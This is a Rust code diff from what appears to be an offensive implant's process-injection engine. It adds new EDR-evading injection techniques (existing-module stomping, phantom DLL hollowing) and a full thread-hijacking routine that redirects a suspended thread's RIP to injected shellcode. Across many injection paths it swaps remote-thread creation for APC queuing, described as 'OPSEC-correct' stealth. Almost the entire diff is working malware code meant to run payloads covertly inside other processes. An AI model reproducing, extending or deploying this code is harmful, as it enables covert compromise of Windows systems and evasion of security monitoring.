@@ -360,8 +360,15 @@ pub enum InjectionTechnique {
     /// image, write the payload, and resume.
     ProcessHollow,
     /// Module stomping: overwrite an existing loaded DLL's `.text` section
-    /// with the payload.
+    /// with the payload. May call `LdrLoadDll` if no suitable pre-loaded DLL
+    /// is found.
     ModuleStomp,
+    /// **Existing-module stomping**: same principle as `ModuleStomp` but
+    /// **never** calls `LoadLibrary` / `LdrLoadDll`. Reuses an already-loaded
+    /// DLL backed by a real file on disk. The module appears legitimate to
+    /// EDR: valid PEB entry, on-disk backing, no image-load kernel callback.
+    /// Prefer over `ModuleStomp` when maximum stealth is required.
+    ExistingModuleStomp,
     /// Early-bird APC injection: queue a user-mode APC to a thread in the
     /// target before it starts executing.
     EarlyBirdApc,
@@ -534,6 +541,17 @@ pub enum InjectionTechnique {
     /// changes shortly after loading.  Ranked above standard `ModuleStomp`
     /// in auto-selection when `prefer_over_stomp = true` (default).
     DelayedModuleStomp,
+
+    /// Phantom DLL hollowing: maps a DLL via `NtCreateSection` +
+    /// `NtMapViewOfSection` (never written to disk), creates a suspended
+    /// host process (e.g. svchost.exe), unmaps the host image, maps the
+    /// phantom section into the host process, fixes relocations + IAT,
+    /// updates PEB `ImageBaseAddress`, and resumes.  The process appears
+    /// completely legitimate (host binary backed on disk) but executes the
+    /// phantom DLL's code.  Uses exclusively section-based memory management
+    /// — no `VirtualAlloc`/`VirtualAllocEx`.  Ranked above standard
+    /// `ProcessHollow` in auto-selection when the feature is enabled.
+    PhantomDllHollow,
 }
 
 // ── Configuration ────────────────────────────────────────────────────────────
@@ -1847,6 +1865,7 @@ fn try_technique_evasive(
     match technique {
         InjectionTechnique::ProcessHollow
         | InjectionTechnique::ModuleStomp
+        | InjectionTechnique::ExistingModuleStomp
         | InjectionTechnique::EarlyBirdApc => {
             // These delegate to the existing injection module which already
             // handles memory protection correctly. We just add jitter.
@@ -1966,6 +1985,18 @@ fn try_technique_evasive(
             let result = try_technique(technique, pid, payload);
             if jitter {
                 jitter_delay(70);
+            }
+            result
+        }
+        InjectionTechnique::PhantomDllHollow => {
+            // Phantom DLL hollowing: section-backed DLL injected into a
+            // suspended host process. No disk writes, no VirtualAlloc.
+            if jitter {
+                jitter_delay(90);
+            }
+            let result = try_technique(technique, pid, payload);
+            if jitter {
+                jitter_delay(110);
             }
             result
         }
@@ -2729,9 +2760,12 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
         ];
         #[cfg(feature = "transacted-hollowing")]
         techniques.push(th);
+        #[cfg(feature = "phantom-dll-hollow")]
+        techniques.push(InjectionTechnique::PhantomDllHollow);
         techniques.push(InjectionTechnique::ProcessHollow);
         #[cfg(feature = "delayed-stomp")]
         techniques.push(InjectionTechnique::DelayedModuleStomp);
+        techniques.push(InjectionTechnique::ExistingModuleStomp);
         techniques.push(InjectionTechnique::ModuleStomp);
         techniques
     } else if lower.contains("explorer") {
@@ -2746,9 +2780,12 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
         ];
         #[cfg(feature = "transacted-hollowing")]
         techniques.push(th);
+        #[cfg(feature = "phantom-dll-hollow")]
+        techniques.push(InjectionTechnique::PhantomDllHollow);
         techniques.push(InjectionTechnique::ProcessHollow);
         #[cfg(feature = "delayed-stomp")]
         techniques.push(InjectionTechnique::DelayedModuleStomp);
+        techniques.push(InjectionTechnique::ExistingModuleStomp);
         techniques.push(InjectionTechnique::ModuleStomp);
         techniques
     } else if lower.contains("service") || lower.ends_with("svc.exe") || lower.ends_with("host.exe")
@@ -2762,9 +2799,12 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
         ];
         #[cfg(feature = "delayed-stomp")]
         techniques.push(InjectionTechnique::DelayedModuleStomp);
+        techniques.push(InjectionTechnique::ExistingModuleStomp);
         techniques.push(InjectionTechnique::ModuleStomp);
         #[cfg(feature = "transacted-hollowing")]
         techniques.push(th);
+        #[cfg(feature = "phantom-dll-hollow")]
+        techniques.push(InjectionTechnique::PhantomDllHollow);
         techniques.push(InjectionTechnique::ProcessHollow);
         techniques.push(tp);
         techniques.push(InjectionTechnique::EarlyBirdApc);
@@ -2773,9 +2813,12 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
         let mut techniques = vec![wth.clone(), InjectionTechnique::ContextOnly, sm, nsip, cb];
         #[cfg(feature = "transacted-hollowing")]
         techniques.push(th);
+        #[cfg(feature = "phantom-dll-hollow")]
+        techniques.push(InjectionTechnique::PhantomDllHollow);
         techniques.push(InjectionTechnique::ProcessHollow);
         #[cfg(feature = "delayed-stomp")]
         techniques.push(InjectionTechnique::DelayedModuleStomp);
+        techniques.push(InjectionTechnique::ExistingModuleStomp);
         techniques.push(InjectionTechnique::ModuleStomp);
         techniques.push(InjectionTechnique::EarlyBirdApc);
         techniques.push(tp);
@@ -2819,6 +2862,8 @@ fn try_technique(
             inject_transacted_hollowing_dispatch(pid, payload)
         }
         InjectionTechnique::DelayedModuleStomp => inject_delayed_stomp_dispatch(pid, payload),
+        InjectionTechnique::ExistingModuleStomp => inject_existing_module_stomp(pid, payload),
+        InjectionTechnique::PhantomDllHollow => inject_phantom_dll_hollow_dispatch(pid, payload),
     }
 }
 
@@ -2904,6 +2949,53 @@ fn inject_delayed_stomp_dispatch(
     })
 }
 
+// ── Phantom DLL hollowing dispatch ───────────────────────────────────────────
+
+/// Dispatch function for phantom DLL hollowing injection.
+///
+/// Creates a section object backed by the payload DLL (never written to disk),
+/// creates a suspended host process, unmaps the host image, maps the phantom
+/// section into the host process, fixes relocations + IAT, updates PEB
+/// ImageBaseAddress, and resumes.  No VirtualAlloc/VirtualAllocEx — uses
+/// exclusively NtCreateSection + NtMapViewOfSection.
+#[cfg(feature = "phantom-dll-hollow")]
+fn inject_phantom_dll_hollow_dispatch(
+    _pid: u32,
+    payload: &[u8],
+) -> Result<InjectionHandle, InjectionError> {
+    // Phantom DLL hollowing creates its own sacrificial host process;
+    // the pid parameter is ignored (same as ProcessHollow).
+    unsafe {
+        crate::injection::phantom_dll_hollow::phantom_dll_hollow(payload)
+            .map(|r| InjectionHandle {
+                target_pid: 0, // Process was already created and resumed.
+                technique_used: InjectionTechnique::PhantomDllHollow,
+                injected_base_addr: r.phantom_base,
+                payload_size: payload.len(),
+                thread_handle: Some(r.thread_handle),
+                process_handle: r.process_handle,
+                sleep_enrolled: false,
+                sleep_stub_addr: 0,
+            })
+            .map_err(|e| InjectionError::InjectionFailed {
+                technique: InjectionTechnique::PhantomDllHollow,
+                reason: format!("{e:#}"),
+            })
+    }
+}
+
+/// Stub when the feature is disabled.
+#[cfg(not(feature = "phantom-dll-hollow"))]
+fn inject_phantom_dll_hollow_dispatch(
+    _pid: u32,
+    _payload: &[u8],
+) -> Result<InjectionHandle, InjectionError> {
+    Err(InjectionError::InjectionFailed {
+        technique: InjectionTechnique::PhantomDllHollow,
+        reason: "phantom-dll-hollow feature not enabled".to_string(),
+    })
+}
+
 fn inject_process_hollow(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     crate::injection::inject_with_method(
         crate::injection::InjectionMethod::Hollowing,
@@ -2952,6 +3044,32 @@ fn inject_module_stomp(pid: u32, payload: &[u8]) -> Result<InjectionHandle, Inje
     })
 }
 
+fn inject_existing_module_stomp(
+    pid: u32,
+    payload: &[u8],
+) -> Result<InjectionHandle, InjectionError> {
+    crate::injection::inject_with_method(
+        crate::injection::InjectionMethod::ExistingModuleStomp,
+        pid,
+        payload,
+    )
+    .map_err(|e| InjectionError::InjectionFailed {
+        technique: InjectionTechnique::ExistingModuleStomp,
+        reason: e.to_string(),
+    })?;
+
+    Ok(InjectionHandle {
+        target_pid: pid,
+        technique_used: InjectionTechnique::ExistingModuleStomp,
+        injected_base_addr: 0,
+        payload_size: payload.len(),
+        thread_handle: None,
+        process_handle: std::ptr::null_mut(),
+        sleep_enrolled: false,
+        sleep_stub_addr: 0,
+    })
+}
+
 fn inject_early_bird(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     // Early-bird APC: queue an APC to a thread in the target process before
     // it begins executing.  Delegate to the existing APC inject helper in
@@ -2983,28 +3101,120 @@ fn inject_early_bird(pid: u32, payload: &[u8]) -> Result<InjectionHandle, Inject
 
 fn inject_thread_hijack(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     // Thread hijacking: suspend an existing thread, write shellcode, redirect
-    // RIP, resume.  We implement this inline using NtCreateThreadEx with
-    // CREATE_SUSPENDED pattern, since pure thread-hijack requires careful
-    // context save/restore that is fragile across Windows versions.
-    //
-    // Fall back to NtCreateThread-based injection.
-    let (h_proc, remote_base) = unsafe { alloc_write_exec(pid, payload)? };
+    // RIP, resume.  We find a candidate thread via find_alertable_thread or
+    // fall back to enumerating threads, then use NtGet/SetContextThread to
+    // redirect execution.
+    unsafe {
+        // ── Step 1: Open process and allocate+write+exec payload ────────
+        let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;
 
-    // Create suspended thread at the shellcode entry point.
-    let h_thread = unsafe { create_suspended_thread(h_proc, remote_base)? };
-    // Resume immediately — the thread will execute the payload.
-    let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        // ── Step 2: Find a suitable thread to hijack ────────────────────
+        let (h_thread, tid) = find_alertable_thread(h_proc, pid).or_else(|| {
+            // If no alertable thread, try enumerating all threads and pick
+            // the first one we can open with sufficient access.
+            find_any_thread(h_proc, pid)
+        }).ok_or_else(|| InjectionError::InjectionFailed {
+            technique: InjectionTechnique::ThreadHijack,
+            reason: format!("no hijackable thread found in pid {}", pid),
+        })?;
 
-    Ok(InjectionHandle {
-        target_pid: pid,
-        technique_used: InjectionTechnique::ThreadHijack,
-        injected_base_addr: remote_base,
-        payload_size: payload.len(),
-        thread_handle: Some(h_thread),
-        process_handle: h_proc,
-        sleep_enrolled: false,
-        sleep_stub_addr: 0,
-    })
+        log::info!(
+            "injection_engine: ThreadHijack: hijacking thread {} in pid {}",
+            tid, pid,
+        );
+
+        // ── Step 3: Suspend the thread ──────────────────────────────────
+        let mut suspend_count: u32 = 0;
+        let susp = crate::emulated_syscall!(
+            "NtSuspendThread",
+            h_thread as u64,
+            &mut suspend_count as *mut _ as u64,
+        );
+        if susp.is_err() || susp.unwrap() < 0 {
+            let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+            let _ = crate::emulated_syscall!("NtClose", h_proc as u64);
+            return Err(InjectionError::InjectionFailed {
+                technique: InjectionTechnique::ThreadHijack,
+                reason: format!("NtSuspendThread(tid={}) failed", tid),
+            });
+        }
+
+        // ── Step 4: Get the thread's current context ────────────────────
+        let mut ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
+        ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;
+        let get_ctx = crate::emulated_syscall!(
+            "NtGetContextThread",
+            h_thread as u64,
+            &mut ctx as *mut _ as u64,
+        );
+        if get_ctx.is_err() || get_ctx.unwrap() < 0 {
+            let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+            let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+            let _ = crate::emulated_syscall!("NtClose", h_proc as u64);
+            return Err(InjectionError::InjectionFailed {
+                technique: InjectionTechnique::ThreadHijack,
+                reason: "NtGetContextThread failed".to_string(),
+            });
+        }
+
+        // Save original RIP for debugging.
+        let original_rip = context_ip(&ctx);
+        log::debug!(
+            "injection_engine: ThreadHijack: thread {} original RIP={:#x}",
+            tid, original_rip,
+        );
+
+        // ── Step 5: Redirect RIP to payload ─────────────────────────────
+        set_context_ip(&mut ctx, remote_base as u64);
+
+        let set_ctx = crate::emulated_syscall!(
+            "NtSetContextThread",
+            h_thread as u64,
+            &ctx as *const _ as u64,
+        );
+        if set_ctx.is_err() || set_ctx.unwrap() < 0 {
+            // Restore original context on failure.
+            set_context_ip(&mut ctx, original_rip);
+            let _ = crate::emulated_syscall!(
+                "NtSetContextThread",
+                h_thread as u64,
+                &ctx as *const _ as u64,
+            );
+            let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+            let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+            let _ = crate::emulated_syscall!("NtClose", h_proc as u64);
+            return Err(InjectionError::InjectionFailed {
+                technique: InjectionTechnique::ThreadHijack,
+                reason: "NtSetContextThread failed".to_string(),
+            });
+        }
+
+        // ── Step 6: Flush I-cache and resume ────────────────────────────
+        let _ = crate::emulated_syscall!(
+            "NtFlushInstructionCache",
+            h_proc as u64,
+            remote_base as u64,
+            payload.len() as u64,
+        );
+        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+
+        log::info!(
+            "injection_engine: ThreadHijack: thread {} RIP redirected {:#x} → {:#x}",
+            tid, original_rip, remote_base,
+        );
+
+        // Keep the thread handle open — caller may need it for cleanup.
+        Ok(InjectionHandle {
+            target_pid: pid,
+            technique_used: InjectionTechnique::ThreadHijack,
+            injected_base_addr: remote_base,
+            payload_size: payload.len(),
+            thread_handle: Some(h_thread),
+            process_handle: h_proc,
+            sleep_enrolled: false,
+            sleep_stub_addr: 0,
+        })
+    }
 }
 
 // ── NEW: ThreadPool injection (PoolParty variants) ──────────────────────────
@@ -3253,12 +3463,8 @@ fn inject_threadpool_work(pid: u32, payload: &[u8]) -> Result<InjectionHandle, I
             stub.len() as u64,
         );
 
-        // Create a thread to run the stub (fire-and-forget).
-        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-
-        // Close thread handle — the stub orchestrates its own lifecycle.
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, stub_remote as usize, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -3451,10 +3657,8 @@ fn inject_threadpool_worker_factory(
             stub.len() as u64,
         );
 
-        // Execute stub via a remote thread.
-        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, stub_remote as usize, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -3618,9 +3822,8 @@ fn inject_threadpool_timer(pid: u32, payload: &[u8]) -> Result<InjectionHandle, 
             stub.len() as u64,
         );
 
-        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, stub_remote as usize, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -3838,9 +4041,8 @@ fn inject_threadpool_io_completion(
             stub.len() as u64,
         );
 
-        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, stub_remote as usize, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -4061,9 +4263,8 @@ fn inject_threadpool_wait(pid: u32, payload: &[u8]) -> Result<InjectionHandle, I
             stub.len() as u64,
         );
 
-        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, stub_remote as usize, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -4247,9 +4448,8 @@ fn inject_threadpool_alpc(pid: u32, payload: &[u8]) -> Result<InjectionHandle, I
             stub.len() as u64,
         );
 
-        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, stub_remote as usize, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -4448,9 +4648,8 @@ fn inject_threadpool_direct(pid: u32, payload: &[u8]) -> Result<InjectionHandle,
             stub.len() as u64,
         );
 
-        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, stub_remote as usize, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -4652,9 +4851,8 @@ fn inject_threadpool_async_io(pid: u32, payload: &[u8]) -> Result<InjectionHandl
             stub.len() as u64,
         );
 
-        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, stub_remote as usize, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5220,10 +5418,8 @@ fn inject_callback_enum_system_locales(
             caller.len() as u64,
         );
 
-        // Execute the caller stub via a suspended thread.
-        let h_thread = create_suspended_thread(h_proc, remote_caller as usize)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute the caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, remote_caller as usize, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5274,9 +5470,8 @@ fn inject_callback_enum_windows(
         // Write and execute caller stub.
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
 
-        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, caller_remote, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5337,9 +5532,8 @@ fn inject_callback_enum_child_windows(
         caller.push(0xC3); // ret
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
-        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, caller_remote, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5411,9 +5605,8 @@ fn inject_callback_enum_desktop_windows(
         caller.push(0xC3); // ret
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
-        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, caller_remote, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5543,9 +5736,8 @@ fn inject_callback_create_timer_queue(
         caller.push(0xC3);
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
-        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, caller_remote, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5599,9 +5791,8 @@ fn inject_callback_enum_time_formats(
         caller.push(0xC3); // ret
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
-        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, caller_remote, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5668,9 +5859,8 @@ fn inject_callback_enum_resource_types(
         caller.push(0xC3); // ret
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
-        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, caller_remote, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5783,9 +5973,8 @@ fn inject_callback_enum_font_families(
         caller.push(0xC3); // ret
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
-        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, caller_remote, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5842,9 +6031,8 @@ fn inject_callback_cert_enum_system_store(
         caller.push(0xC3); // ret
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
-        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, caller_remote, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5900,9 +6088,8 @@ fn inject_callback_sh_enum_unread_mail(
         caller.push(0xC3); // ret
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
-        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, caller_remote, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -5974,9 +6161,8 @@ fn inject_callback_enumerate_loaded_modules(
         caller.push(0xC3); // ret
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
-        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, caller_remote, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -6164,9 +6350,8 @@ fn inject_callback_copy_file_ex(
         caller.push(0xC3); // ret
 
         let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
-        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute caller stub via APC on an alertable thread — no remote thread creation.
+        execute_via_apc(h_proc, pid, caller_remote, &technique)?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -6685,17 +6870,17 @@ fn inject_section_mapping(
 
                     let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
 
-                    if apc_status.is_err() || apc_status.unwrap() < 0 {
-                        // APC failed — fall back to thread creation.
-                        let h_thread = create_suspended_thread(h_proc, remote_base as usize)?;
-                        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-                        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+                    if apc_status.as_ref().map(|&s| s < 0).unwrap_or(true) {
+                        return Err(InjectionError::InjectionFailed {
+                            technique: technique.clone(),
+                            reason: "APC queued but NtQueueApcThread failed".to_string(),
+                        });
                     }
                 } else {
-                    // No alertable thread found — fall back to thread creation.
-                    let h_thread = create_suspended_thread(h_proc, remote_base as usize)?;
-                    let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-                    let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+                    return Err(InjectionError::InjectionFailed {
+                        technique: technique.clone(),
+                        reason: "no alertable thread found for APC execution".to_string(),
+                    });
                 }
             }
             SectionExecMethod::Thread => {
@@ -6734,10 +6919,8 @@ fn inject_section_mapping(
                 // Write caller stub to target process.
                 let caller_remote = write_section_stub(h_proc, &caller_stub)?;
 
-                // Execute caller stub.
-                let h_thread = create_suspended_thread(h_proc, caller_remote)?;
-                let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-                let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+                // Execute caller stub via APC on an alertable thread — no remote thread creation.
+                execute_via_apc(h_proc, pid, caller_remote, &technique)?;
             }
         }
 
@@ -7508,12 +7691,14 @@ fn inject_fiber(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionEr
             stub.len() as u64,
         );
 
-        // Create a suspended thread to run the fiber stub, then resume.
-        let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = crate::emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
-
-        // Close thread — fire-and-forget.
-        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+        // Execute the fiber stub via APC on an alertable thread — no remote
+        // thread creation needed.
+        execute_via_apc(
+            h_proc,
+            pid,
+            stub_remote as usize,
+            &InjectionTechnique::FiberInject,
+        )?;
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -8204,6 +8389,39 @@ fn build_restore_trampoline_x86_64(
     trampoline.push(0xC3);
 
     trampoline
+}
+
+/// Find any openable thread in the target process and return its handle + TID.
+///
+/// Used by `inject_thread_hijack` when no alertable thread is available.
+/// Opens the first thread that can be opened with THREAD_GET_CONTEXT |
+/// THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME access.
+unsafe fn find_any_thread(
+    _h_proc: *mut c_void,
+    pid: u32,
+) -> Option<(*mut c_void, u32)> {
+    let tid = find_best_thread(pid)?;
+    let thread_access: u64 = 0x0008 | 0x0010 | 0x0002; // GET_CONTEXT | SET_CONTEXT | SUSPEND_RESUME
+    let mut client_id = [0u64; 2];
+    client_id[0] = pid as u64;
+    client_id[1] = tid as u64;
+    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+
+    let mut h_thread: usize = 0;
+    let status = crate::emulated_syscall!(
+        "NtOpenThread",
+        &mut h_thread as *mut _ as u64,
+        thread_access,
+        &mut obj_attr as *mut _ as u64,
+        client_id.as_mut_ptr() as u64,
+    );
+
+    if status.is_ok() && status.unwrap() >= 0 && h_thread != 0 {
+        Some((h_thread as *mut c_void, tid))
+    } else {
+        None
+    }
 }
 
 /// Find the best candidate thread for CONTEXT-only injection in the target
@@ -9894,6 +10112,60 @@ unsafe fn create_suspended_thread(
     Ok(h_thread)
 }
 
+/// Execute `start_addr` in the target process by queuing a user-mode APC on
+/// an alertable thread. Returns `Ok(())` if the APC was queued successfully.
+///
+/// This is the OPSEC-correct alternative to `create_suspended_thread` for
+/// techniques that must not create visible remote threads (callback, fiber,
+/// thread-pool, section-mapping APC paths).
+///
+/// Fails with an error if no alertable thread can be found rather than
+/// falling back to `NtCreateThreadEx`.
+unsafe fn execute_via_apc(
+    h_proc: *mut c_void,
+    pid: u32,
+    start_addr: usize,
+    technique: &InjectionTechnique,
+) -> Result<(), InjectionError> {
+    if let Some((h_thread, tid)) = find_alertable_thread(h_proc, pid) {
+        let apc_status = crate::emulated_syscall!(
+            "NtQueueApcThread",
+            h_thread as u64,
+            start_addr as u64,
+            0u64,
+            0u64,
+            0u64,
+        );
+        let _ = crate::emulated_syscall!("NtClose", h_thread as u64);
+
+        if apc_status.as_ref().map(|&s| s < 0).unwrap_or(true) {
+            return Err(InjectionError::InjectionFailed {
+                technique: technique.clone(),
+                reason: format!(
+                    "NtQueueApcThread to tid {} failed (status={:?})",
+                    tid,
+                    apc_status
+                ),
+            });
+        }
+        log::info!(
+            "injection_engine: queued APC at {:#x} on alertable thread {} in pid {}",
+            start_addr,
+            tid,
+            pid,
+        );
+        Ok(())
+    } else {
+        Err(InjectionError::InjectionFailed {
+            technique: technique.clone(),
+            reason: format!(
+                "no alertable thread found in pid {} — cannot execute via APC without creating a remote thread",
+                pid
+            ),
+        })
+    }
+}
+
 // ── Technique string parser ─────────────────────────────────────────────────
 
 /// Parse a technique name string into an `InjectionTechnique`.
@@ -9916,6 +10188,7 @@ unsafe fn create_suspended_thread(
